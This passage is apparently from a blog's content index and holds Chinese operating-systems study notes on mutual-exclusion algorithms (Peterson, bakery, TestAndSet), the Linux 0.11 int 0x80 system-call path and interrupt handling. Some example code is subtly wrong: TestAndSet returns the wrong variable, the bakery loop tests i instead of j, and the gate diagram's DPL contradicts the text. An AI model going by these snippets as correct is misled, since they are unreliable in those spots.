title="临界区代码的保护原则："></a>临界区代码的保护原则：</h3><ol><li><strong>互斥进入</strong>：如果一个进程在临界区中执行，则其它进程不允许进入。这种进程间的约束关系称为<strong>互斥</strong>（<strong>mutual exclusion</strong>）</li><li>有空让进：如果当临界区空闲时，有一个进程想要进去，就必须让该进程马上进入</li><li>有限等待：从进程发出请求进入临界区到允许进入，不能无限等待</li></ol><h3 id="轮换法-值日法"><a href="#轮换法-值日法" class="headerlink" title="轮换法(值日法)"></a>轮换法(值日法)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> turn = <span class="number">0</span>;</span><br><span class="line">进程P0 &#123;</span><br><span class="line">    <span class="keyword">while</span> (turn != <span class="number">0</span>); <span class="comment">// 空转</span></span><br><span class="line">    <span class="comment">/* 临界区 */</span></span><br><span class="line">    turn = <span class="number">1</span>; <span class="comment">// 退出区</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">进程P1 &#123;</span><br><span class="line">    <span class="keyword">while</span> (turn != <span class="number">1</span>); <span class="comment">// 空转</span></span><br><span class="line">    <span class="comment">/* 临界区 */</span></span><br><span class="line">    turn = <span class="number">0</span>; <span class="comment">// 退出区</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概意思就是，没轮到我执行就空转，我执行好了，就把执行机会让给你</p><p>轮换法的缺点：把turn交给对方后，对方迟迟不肯使用，导致我方也无法使用。不符合<strong>有空让进</strong>原则</p><h3 id="标记法"><a href="#标记法" class="headerlink" title="标记法"></a>标记法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">进程P0 &#123;</span><br><span class="line">    flag[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span> (flag[<span class="number">1</span>]); <span class="comment">// 空转</span></span><br><span class="line">    <span class="comment">/* 临界区 */</span></span><br><span class="line">    flag[<span class="number">0</span>] = <span class="literal">false</span>; <span class="comment">// 退出区</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">进程P1 &#123;</span><br><span class="line">    flag[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span> (flag[<span class="number">0</span>]); <span class="comment">// 空转</span></span><br><span class="line">    <span class="comment">/* 临界区 */</span></span><br><span class="line">    flag[<span class="number">1</span>] = <span class="literal">false</span>; <span class="comment">// 退出区</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概意思是，到我执行了，我先打个标记表示我要执行了，如果你先打了标记，就空转等你执行好。我执行好了就把标记撤下来。</p><p>标记法的缺点：因为系统调度的缘故，在对方标记的同时，我方也进行了标记，导致二者进入僵持状态，都不进入临界区，不满足有限等待原则</p><hr><p>上面讲述的是两个小方法，各有优缺点，并不能很好的满足要求。</p><h3 id="Perterson算法"><a href="#Perterson算法" class="headerlink" title="Perterson算法"></a>Perterson算法</h3><ul><li>结合了轮转和标记两种方法</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">进程P0 &#123;</span><br><span class="line">    flag[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span> (flag[<span class="number">1</span>] &amp;&amp; turn == <span class="number">1</span>); <span class="comment">// 空转</span></span><br><span class="line">    <span class="comment">/* 临界区 */</span></span><br><span class="line">    flag[<span class="number">0</span>] = <span class="literal">false</span>; </span><br><span class="line">    turn = <span class="number">1</span>;        <span class="comment">//退出区</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">进程P1 &#123;</span><br><span class="line">    flag[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span> (flag[<span class="number">0</span>] &amp;&amp; turn == <span class="number">0</span>); <span class="comment">// 空转</span></span><br><span class="line">    <span class="comment">/* 临界区 */</span></span><br><span class="line">    flag[<span class="number">1</span>] = <span class="literal">false</span>;</span><br><span class="line">    turn = <span class="number">0</span>;        <span class="comment">// 退出区</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>空转的条件更加严格，对方已经先打上了标记并且我方之前已经把执行的机会让给了对方</p><p>靠一个<code>turn</code>满足了互斥原则</p><p>我如果想进，就先打上标记，如果此时turn在对方那，但是对方阻塞了没有打上标记，此时不满足空转条件，我就能进去，满足了有空让进原则</p><p>在满足了有空让进原则的前提下，我进去执行时，对方如果也想进去，此时我已经打上了标记并且执行权在我这，对方进入空转；我执行好后，就算只先把标记撤掉，对方也能满足进入临界区的条件。满足了有限等待原则</p><p><strong>Peterson算法</strong>只能满足两个进程，如果有多个进程，就需要进化为<strong>面包店算法</strong></p><p>下面讲述三个主要的算法</p><h3 id="面包店算法"><a href="#面包店算法" class="headerlink" title="面包店算法"></a>面包店算法</h3><ul><li>如何轮转：每个进程获得一个序号，序号最小的的进入临界区</li><li>如何标记：序号不为0表示打上标记，进程在退出区将序号置为0</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">进程Pi &#123;</span><br><span class="line">    choosing[i] = <span class="literal">true</span>; <span class="comment">// 开始选号</span></span><br><span class="line">    num[i] = max(num[<span class="number">0</span>],...,num[n<span class="number">-1</span>]) + <span class="number">1</span>;</span><br><span class="line">    choosing[i] = <span class="literal">false</span>; <span class="comment">// 选号结束</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; i &lt; n; j++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (choosing[j]); <span class="comment">// 等别人选完号</span></span><br><span class="line">        <span class="keyword">while</span> (num[j] != <span class="number">0</span> &amp;&amp; num[j] &lt; num[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 临界区 */</span></span><br><span class="line">    num[i] = <span class="number">0</span>; <span class="comment">// 退出区</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只有最小号进程能够进入，满足互斥原则</p><p>如果没有进程在临界区中，最小序号一定能够进入，满足有空让进原则</p><p>等待前面的进程执行完后就轮到了，满足有限等待原则</p><h3 id="关中断"><a href="#关中断" class="headerlink" title="关中断"></a>关中断</h3><p>调度由中断触发，只要关中断，调度也就不会触发，就能保证只有一个进程进入临界区</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">进程Pi &#123;</span><br><span class="line">cli(); <span class="comment">// close interrupt关中断，系统调用函数，只有一条内嵌汇编指令用于关中断</span></span><br><span class="line"><span class="comment">/* 临界区 */</span></span><br><span class="line">sti(); <span class="comment">// start interrupt开中断   </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中断的开关是由<code>INTR</code>这个寄存器实现的，如果<code>INTR</code>为 1 表示关中断，中断不会触发也就不会有别的进程进入同一个临界区。但是如果是多<code>CPU</code>或者多核处理器，每个CPU都有自己的<code>INTR</code>这时就有可能导致别的进程进入临界区</p><h3 id="硬件原子指令"><a href="#硬件原子指令" class="headerlink" title="硬件原子指令"></a>硬件原子指令</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">TestAndSet</span><span class="params">(<span class="type">bool</span>&amp; x)</span> <span class="comment">// 原子函数，三段代码一次执行完毕</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">bool</span> rv = x;</span><br><span class="line">    x = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line">进程Pi &#123;</span><br><span class="line">    <span class="keyword">while</span> (TestAndSet(lock)); <span class="comment">// lock==true表示被锁上了，空转</span></span><br><span class="line">    <span class="comment">/* 临界区 */</span></span><br><span class="line">    lock = <span class="literal">false</span>; <span class="comment">//退出区，解锁</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会有硬件确保<code>TestAndSet()</code>不会被打断</p><hr><p><strong>用临界区去保护信号量，用信号量去实现同步</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【哈工大操作系统】系统调用的实现</title>
      <link href="/2024/03/31/%E3%80%90%E5%93%88%E5%B7%A5%E5%A4%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%91%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
      <url>/2024/03/31/%E3%80%90%E5%93%88%E5%B7%A5%E5%A4%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%91%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="系统调用的实现"><a href="#系统调用的实现" class="headerlink" title="系统调用的实现"></a>系统调用的实现</h1><p>以<code>write()</code>函数为例，<code>write()</code>函数就是一个<strong>系统调用函数</strong>，其定义在<code>linux-0.11/lib/write.c</code>中，这个文件的内容非常简单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// linux-0.11/lib/write.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LIBRARY__</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">_syscall3(<span class="type">int</span>,write,<span class="type">int</span>,fd,<span class="type">const</span> <span class="type">char</span> *,buf,<span class="type">off_t</span>,count)</span><br></pre></td></tr></table></figure><p>就三行，开启了<code>write()</code>函数的定义</p><p>函数的定义并不像我们平常写C语言那样，它是用<strong>宏</strong>去定义的，所以会发现这里完全不符合C语言的规定，甚至没有分号</p><p>这段宏展开后是什么样的，需要先去查看以下宏定义，<code>_syscall3()</code>的宏定义在<code>linux0.11/include/unistd.h</code>下，将其截取出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// linux0.11/include/unistd.h</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write4</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _syscall3(type,name,atype,a,btype,b,ctype,c) \</span></span><br><span class="line"><span class="meta">type name(atype a,btype b,ctype c) \</span></span><br><span class="line"><span class="meta">&#123; \</span></span><br><span class="line"><span class="meta">long __res; \</span></span><br><span class="line"><span class="meta">__asm__ volatile (<span class="string">&quot;int $0x80&quot;</span> \</span></span><br><span class="line"><span class="meta">: <span class="string">&quot;=a&quot;</span> (__res) \</span></span><br><span class="line"><span class="meta">: <span class="string">&quot;0&quot;</span> (__NR_##name),<span class="string">&quot;b&quot;</span> ((long)(a)),<span class="string">&quot;c&quot;</span> ((long)(b)),<span class="string">&quot;d&quot;</span> ((long)(c))); \</span></span><br><span class="line"><span class="meta"><span class="keyword">if</span> (__res&gt;=0) \</span></span><br><span class="line"><span class="meta">return (type) __res; \</span></span><br><span class="line"><span class="meta">errno=-__res; \</span></span><br><span class="line"><span class="meta">return -1; \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><p>有点复杂，简单来说它相当于一个类，定义了一个系统函数的大致模样，而这个<code>_syscall3</code>就描述了需要接收3个参数的函数的样子。</p><p>所以<code>write.c</code>的宏展开后是这样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// write.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">char</span>* buf, <span class="type">off_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> __res;</span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;int $0x80&quot;</span></span></span><br><span class="line"><span class="params">        : <span class="string">&quot;=a&quot;</span> (__res)</span></span><br><span class="line"><span class="params">        : <span class="string">&quot;0&quot;</span> (__NR_write), <span class="string">&quot;b&quot;</span> ((<span class="type">long</span>)(fd)), <span class="string">&quot;c&quot;</span> ((<span class="type">long</span>)(buf)), <span class="string">&quot;d&quot;</span> ((<span class="type">long</span>)(count))</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="keyword">if</span> (__res &gt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>) __res;</span><br><span class="line">    errno = -__res;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__NR_write</code>的宏定义已经在<code>/include/unistd.h</code>中给出，就是 4</p><p>这就是<code>write()</code>作为系统调用函数的完整定义了，主要还是用汇编实现的，重点是在<code>eax</code>中填入功能号然后调用<code>0x80</code>中断</p><blockquote><p>这个中断，使得<strong>CPL&#x3D;3</strong>的write()函数访问了<strong>idt</strong>中编号为0x80的中断描述符，这个中断描述符存储了<strong>DPL</strong>、<strong>段选择子</strong>和<strong>偏移地址</strong>，其中<strong>DPL&#x3D;3</strong>使得write()能够访问这个中断描述符，而<strong>段选择子</strong>的<strong>CPL&#x3D;0</strong>使得之后<strong>CS</strong>中的<strong>CPL&#x3D;0</strong>，从用户态转为了内核态，由此可以访问内核中的东西。</p><p>一句话总结int 0x80的伟大之处就是，令<strong>CPL</strong>为3的指令访问了<strong>DPL</strong>为3的中断描述符，并强制修改了接下来的<strong>CPL</strong>为0</p></blockquote><hr><p>以上就是系统调用的从用户态转换到内核态的过程。接下谈谈<code>int 0x80</code>的实现</p><p>在<strong>idt</strong>中0x80处的中断描述符是如何定义的，这要从<code>linux-0.11/init/main.c</code>开始，简单截取一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// linux-0.11/init/main.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    sched_init();</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sched</strong>这个单词是<strong>schedule</strong>的缩写，也就是说<code>sched_init()</code>这个函数就是一个表格的初始化</p><p>这个函数定义在<code>linux-0.11/kernal/sched.c</code>下，省略了一些东西，重点关注一下最后的<code>set_system_gate()</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sched.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sched_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">set_system_gate(<span class="number">0x80</span>,&amp;system_call);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>set_system_gate()</code>的实现也是个宏，其定义在<code>linux-0.11/include/asm/system.h</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// system.h</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_system_gate(n,addr) \</span></span><br><span class="line"><span class="meta">_set_gate(&amp;idt[n],15,3,addr)</span></span><br></pre></td></tr></table></figure><p><code>_set_gate()</code>的实现也在同一文件中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// system.h</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _set_gate(gate_addr,type,dpl,addr) \</span></span><br><span class="line"><span class="meta">__asm__ (<span class="string">&quot;movw %%dx,%%ax\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;movw %0,%%dx\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;movl %%eax,%1\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;movl %%edx,%2&quot;</span> \</span></span><br><span class="line"><span class="meta">: \</span></span><br><span class="line"><span class="meta">: <span class="string">&quot;i&quot;</span> ((short) (0x8000+(dpl&lt;&lt;13)+(type&lt;&lt;8))), \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;o&quot;</span> (*((char *) (gate_addr))), \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;o&quot;</span> (*(4+(char *) (gate_addr))), \</span></span><br><span class="line"><span class="meta"><span class="string">&quot;d&quot;</span> ((char *) (addr)),<span class="string">&quot;a&quot;</span> (0x00080000))</span></span><br></pre></td></tr></table></figure><p>整理一下<code>set_system_gate(0x80,&amp;system_call)</code>的最终被替换为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dpl = 3, type = 15, gate_addr = &amp;idt[0x80], addr = &amp;system_call</span></span><br><span class="line">__asm__ (</span><br><span class="line">    <span class="string">&quot;movw %%dx,%%ax\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;movl %%eax,%1\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;movl %%edx,%2&quot;</span></span><br><span class="line">    :</span><br><span class="line">    : <span class="string">&quot;i&quot;</span> ((<span class="type">short</span>) (<span class="number">0x8000</span>+(dpl&lt;&lt;<span class="number">13</span>)+(type&lt;&lt;<span class="number">8</span>))),</span><br><span class="line">    <span class="string">&quot;o&quot;</span> (*((<span class="type">char</span> *) (gate_addr))),</span><br><span class="line">    <span class="string">&quot;o&quot;</span> (*(<span class="number">4</span>+(<span class="type">char</span> *) (gate_addr))),</span><br><span class="line">    <span class="string">&quot;d&quot;</span> ((<span class="type">char</span> *) (addr)),<span class="string">&quot;a&quot;</span> (<span class="number">0x00080000</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>虽然看起来挺麻烦，但实际上很简单，就是填写 IDT（中断描述符表），将 <code>system_call</code> 函数地址写到 <code>0x80</code> 对应的中断描述符中，也就是在中断 <code>0x80</code> 发生后，自动调用<code>system_call()</code>函数</p><p>最终这个idt中的中断描述符长这样</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">63                               48 47 46  44 43     40 39 37 36        32</span><br><span class="line">+----------------------------------+--+----+--+--------+-+-+-+----------+</span><br><span class="line">|                                  |  |    |  |        |     |          |</span><br><span class="line">|       &amp;system_call[31:16]        |P |DPL |S |  TYPE  |0 0 0| Reserved |</span><br><span class="line">|                                  |1 | 00 |0 | 1|1|1|1|     |          |</span><br><span class="line">+-------------+--+--+--+--+--------+--+----+--+--------+-+-+-+----------+</span><br><span class="line">31                               17 16                                  0</span><br><span class="line">+----------------------------------+------------------------------------+</span><br><span class="line">|                                  |                                    |</span><br><span class="line">|         Segment Selector         |           &amp;system_call[15:0]       |</span><br><span class="line">|              0x0008              |                                    |</span><br><span class="line">+----------------------------------+------------------------------------+</span><br></pre></td></tr></table></figure><p>可见，系统调用的 CS 段选择符指向了内核代码段描述符，段内偏移是 <code>system_call</code> 的地址。</p><p>然后来说说<code>system_call()</code>函数</p><p>这个<code>system_call()</code>函数是用纯汇编实现，定义在<code>linux-0.11/kernel/system_call.s</code>中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">nr_system_calls = 72</span><br><span class="line">.globl _system_call # 用.globl修饰符修饰为其他函数可见</span><br><span class="line">_system_call:</span><br><span class="line">cmpl $nr_system_calls-1,%eax # 检查系统调用编号是否在合法范围内 </span><br><span class="line">ja bad_sys_call</span><br><span class="line">push %ds</span><br><span class="line">push %es</span><br><span class="line">push %fs</span><br><span class="line">pushl %edx</span><br><span class="line">pushl %ecx# push %ebx,%ecx,%edx as parameters</span><br><span class="line">pushl %ebx# to the system call</span><br><span class="line">movl $0x10,%edx# set up ds,es to kernel space，内核地址空间</span><br><span class="line">mov %dx,%ds3</span><br><span class="line">mov %dx,%es# ds=es=8，指向内核代码段</span><br><span class="line">movl $0x17,%edx# 让fs指向LDT，用户地址空间</span><br><span class="line">mov %dx,%fs</span><br><span class="line"># _sys_call_table(, %eax, 4) = _sys_call_table + 4*eax</span><br><span class="line"># 为什么乘4？因为一个函数指针4个字节</span><br><span class="line">call _sys_call_table(,%eax,4)# 调用了函数表，假设eax=__NR_write</span><br><span class="line">pushl %eax</span><br><span class="line">movl _current,%eax</span><br><span class="line">cmpl $0,state(%eax)# state</span><br><span class="line">jne reschedule</span><br><span class="line">cmpl $0,counter(%eax)# counter</span><br><span class="line">je reschedule</span><br></pre></td></tr></table></figure><p>其中<code>_sys_call_table</code>是一个全局函数数组，定义在<code>linux-0.11/include/linux/sys.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// linux-0.11/include/linux/sys.h</span></span><br><span class="line">...</span><br><span class="line">fn_ptr sys_call_table[] = &#123; ..., sys_write, ... &#125;; <span class="comment">// 恰好在下标为4的地方</span></span><br></pre></td></tr></table></figure><p>这个数组里还有其他很多函数的地址比如<code>sys_close</code>、<code>sys_fork</code><br><code>fn_ptr</code>的定义在<code>linux-0.11/include/linux/sched.h</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// linux-0.11/include/linux/sched.h</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*fn_ptr)</span><span class="params">()</span>; <span class="comment">// 一个指针，指向返回int的函数</span></span><br></pre></td></tr></table></figure><p>很明显，<code>fn_ptr</code>也就是<code>function_pointer</code>是函数指针类型</p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中断</title>
      <link href="/2024/03/26/%E4%B8%AD%E6%96%AD%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/26/%E4%B8%AD%E6%96%AD%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>首先中断分为3类：</p><ol><li><strong>中断</strong>，叫这个名纯粹是因为起不了别的名字而已，我们只需要知道第一类中断产生的原因以及含义即可。英文名叫 interrupt，这类中断由外部设备产生，比如键盘、鼠标等。比如，当我们敲击键盘时，键盘会给 <strong>CPU</strong> 和外设中间的设备 <strong>可编程中断控制器</strong> 发送一个脉冲信号，可编程中断控制器会根据是哪个引脚接收信号来映射出一个<strong>中断号</strong>，将这个中断号存储在与CPU连接的端口上，然后可编程中断控制器会向 <strong>CPU</strong> 发送一个信号，CPU 每次在执行完一条指令后都会检查是否由中断信号需要处理。检测到有外部中断需要处理，它就会去刚刚那个端口读取到这个中断号的值。然后做出相应的处理</li><li><strong>异常</strong>，英文名叫 exception，由 <strong>CPU</strong> 在执行指令时发现有问题时产生一类中断，比如除0异常、错误指令异常、缺页异常等。这些异常都对应一个中断号，CPU内部有自己排线逻辑去接收这个中断号，然后做出相应的处理</li><li><strong>INT 指令</strong>，这个应该很好理解，这是我们自己写在指令当中的，CPU接收到中断号就会像执行函数一样，CPU会跳转到对应的地方做出相应的处理</li></ol><p>它们虽然产生的方式不同，但是殊途同归，都会让<strong>CPU</strong>放下手中的活，先去执行对应的类似函数一样的一系列指令，然后再回来继续执行之前被打断的地方</p><p>那 CPU 收到中断号后，如何处理呢？</p><p>先用一句不太准确的话总结，<strong>CPU 收到一个中断号 n 后，会去中断向量表中寻找第 n 个中断描述符，从中断描述符中找到中断处理程序的地址，然后跳过去执行</strong>。</p><p>具体的又要涉及到段选择子、段描述符、逻辑地址、线性地址和最终的物理地址，这里不多做解释</p><p>具体看<a href="https://mp.weixin.qq.com/s?__biz=Mzk0MjE3NDE0Ng==&mid=2247498208&idx=1&sn=b784f8b4e627ebd1bfb9810d194fdb80&chksm=c2c5834df5b20a5bdee331002bfc61c90eb468da325bf67abeef780c303a9f51c8543e1a5981&scene=21#wechat_redirect">认认真真的聊聊中断</a>这篇文章</p><p>在执行中断代码前，CPU 主要做了这些事，主要是压栈操作</p><p><em><strong>1.</strong></em> 如果发生了特权级转移，压入之前的堆栈段寄存器 SS 及栈顶指针 ESP 保存到栈中，并将堆栈切换为 TSS 中的堆栈。</p><p><em><strong>2.</strong></em> 压入标志寄存器 EFLAGS。</p><p><em><strong>3.</strong></em> 压入之前的代码段寄存器 CS 和指令寄存器 EIP，相当于压入返回地址。</p><p><em><strong>4.</strong></em> 如果此中断有错误码的，压入错误码 ERROR_CODE</p><p><em><strong>5.</strong></em> 结束（之后就跳转到中断程序了）</p><p>之后的栈变成了这样子</p><table><thead><tr><th align="left">低地址</th></tr></thead><tbody><tr><td align="left"><strong>ERROR_CODE</strong>(异常错误码)                                                             $&lt;—— 堆栈指针 SS:ESP$</td></tr><tr><td align="left"><strong>EIP</strong>(中断发生前的指令寄存器)</td></tr><tr><td align="left"><strong>CS</strong>(中断发生前的代码段)</td></tr><tr><td align="left"><strong>EFLAGS</strong>(标志寄存器)</td></tr><tr><td align="left"><strong>ESP</strong>(中断发生前的栈顶指针)</td></tr><tr><td align="left"><strong>高地址</strong></td></tr><tr><td align="left"></td></tr><tr><td align="left"></td></tr><tr><td align="left"></td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C/C++内存对齐</title>
